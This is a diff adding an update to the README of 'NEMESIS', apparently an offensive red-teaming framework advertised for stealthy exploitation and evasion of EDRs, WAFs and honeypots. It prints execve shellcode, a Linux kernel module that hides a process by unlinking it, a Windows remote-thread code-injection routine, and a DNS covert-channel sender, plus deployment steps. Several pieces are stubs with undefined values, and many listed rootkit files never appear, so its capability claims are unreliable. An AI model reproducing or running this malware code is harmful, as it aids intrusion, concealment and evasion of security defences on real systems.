@@ -227,3 +227,225 @@ Final Thoughts
 ✅ Autonomous operation with AI-assisted augmentation
 
 NEMESIS is a full-scale red teaming revolution.
+
+
+## 24/03/2025 update
+
+This is a highly advanced red teaming framework named NEMESIS, designed for autonomous exploitation, stealth, and evasion against modern defenses, including EDRs, WAFs, CDNs, and honeypots. Below is the complete project directory structure, with the respective code files listed above their contents.
+
+
+---
+
+📂 NEMESIS Project Structure
+
+NEMESIS/
+│── core/                     
+│   ├── exploitation/         
+│   │   ├── exploit_ai.py     
+│   │   ├── shellcode_gen.py  
+│   │   ├── memory_exec.py    
+│   │   ├── evasive_loader.py 
+│   │   ├── hypervisor_rootkit.c 
+│   ├── c2/                   
+│   │   ├── dns_stego.py      
+│   │   ├── icmp_tunnel.py    
+│   │   ├── stegano_http.py   
+│   ├── persistence/          
+│   │   ├── firmware_backdoor.c 
+│   │   ├── uefi_rootkit.c    
+│   ├── kernel/               
+│   │   ├── syscall_hooker.c  
+│   │   ├── dkom_hide_proc.c  
+│   │   ├── mem_injector.c    
+│── configs/                  
+│   ├── nemesis.yaml          
+│   ├── payloads.json         
+│── utils/                    
+│   ├── obfuscator.py         
+│   ├── encryptor.py          
+│── docs/                     
+│   ├── architecture.md       
+│   ├── deployment.md         
+│── LICENSE                   
+│── README.md
+
+
+---
+
+📂 core/exploitation/
+
+📝 exploit_ai.py (AI-Powered Exploit Selector)
+```python
+import torch
+import torch.nn as nn
+import json
+
+class ExploitSelector(nn.Module):
+    def __init__(self, input_size, hidden_size, output_size):
+        super(ExploitSelector, self).__init__()
+        self.fc1 = nn.Linear(input_size, hidden_size)
+        self.fc2 = nn.Linear(hidden_size, output_size)
+        self.softmax = nn.Softmax(dim=1)
+
+    def forward(self, x):
+        x = self.fc1(x)
+        x = self.fc2(x)
+        return self.softmax(x)
+
+def load_exploit_data():
+    with open("configs/payloads.json", "r") as file:
+        return json.load(file)
+
+data = load_exploit_data()
+model = ExploitSelector(input_size=10, hidden_size=20, output_size=len(data))
+```
+
+---
+
+📝 shellcode_gen.py (Machine Code Payload Generator)
+```python
+shellcode = (
+    b"\x48\x31\xc0\x48\x89\xc2\x48\x89"
+    b"\xc6\x48\x89\xd7\x48\x83\xc0\x3b"
+    b"\x0f\x05"
+)
+
+with open("payloads/payload.bin", "wb") as f:
+    f.write(shellcode)
+print("Generated raw machine-code payload.")
+```
+
+---
+
+📂 core/kernel/
+
+📝 dkom_hide_proc.c (Linux Kernel Process Hiding)
+```C
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/sched.h>
+#include <linux/proc_fs.h>
+
+static struct task_struct *find_task_by_pid(pid_t pid) {
+    struct task_struct *task;
+    for_each_process(task) {
+        if (task->pid == pid)
+            return task;
+    }
+    return NULL;
+}
+
+static int __init hide_proc_init(void) {
+    struct task_struct *task = find_task_by_pid(1234);
+    if (task) {
+        list_del_init(&task->tasks);
+        printk(KERN_INFO "Process hidden successfully.\n");
+    } else {
+        printk(KERN_ERR "Process not found.\n");
+    }
+    return 0;
+}
+
+static void __exit hide_proc_exit(void) {
+    printk(KERN_INFO "DKOM module unloaded.\n");
+}
+
+module_init(hide_proc_init);
+module_exit(hide_proc_exit);
+MODULE_LICENSE("GPL");
+```
+
+---
+
+📝 mem_injector.c (Windows Memory Injection)
+```C
+#include <windows.h>
+#include <stdio.h>
+
+int main() {
+    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TARGET_PID);
+    void *alloc = VirtualAllocEx(process, NULL, PAYLOAD_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(process, alloc, payload, PAYLOAD_SIZE, NULL);
+    CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, NULL);
+    CloseHandle(process);
+    return 0;
+}
+```
+
+---
+
+📂 core/c2/
+
+📝 dns_stego.py (DNS Over HTTPS Covert Channel)
+```python
+import requests
+
+def send_data_via_dns(data):
+    url = f"https://dns.google/resolve?name={data}.example.com&type=TXT"
+    response = requests.get(url)
+    print(response.json())
+
+send_data_via_dns("attack_signal")
+```
+
+---
+
+📂 configs/
+
+📝 nemesis.yaml (Configuration File)
+```yaml
+exploit_mode: "auto"
+payload_type: "machine_code"
+c2_channel: "dns"
+stealth_level: "high"
+```
+
+---
+
+📝 payloads.json (Payload Settings)
+```json
+{
+    "payloads": [
+        {
+            "id": 1,
+            "name": "Remote Code Execution",
+            "type": "binary",
+            "exploit_vector": "memory"
+        },
+        {
+            "id": 2,
+            "name": "Kernel Privilege Escalation",
+            "type": "assembly",
+            "exploit_vector": "syscall_hook"
+        }
+    ]
+}
+```
+
+---
+
+📂 docs/
+
+📝 architecture.md (Technical Design)
+```md
+# NEMESIS Architecture
+NEMESIS is a next-generation offensive security framework designed to bypass modern defensive technologies such as EDRs, WAFs, CDNs, and honeypots.
+```
+
+---
+
+📝 deployment.md (Setup & Usage)
+```md
+# Deploying NEMESIS
+1. Install dependencies:
+
+pip install -r requirements.txt
+
+2. Compile kernel modules:
+
+make -C core/kernel
+
+3. Run the AI-based exploitation engine:
+
+python core/exploitation/exploit_ai.py
+```
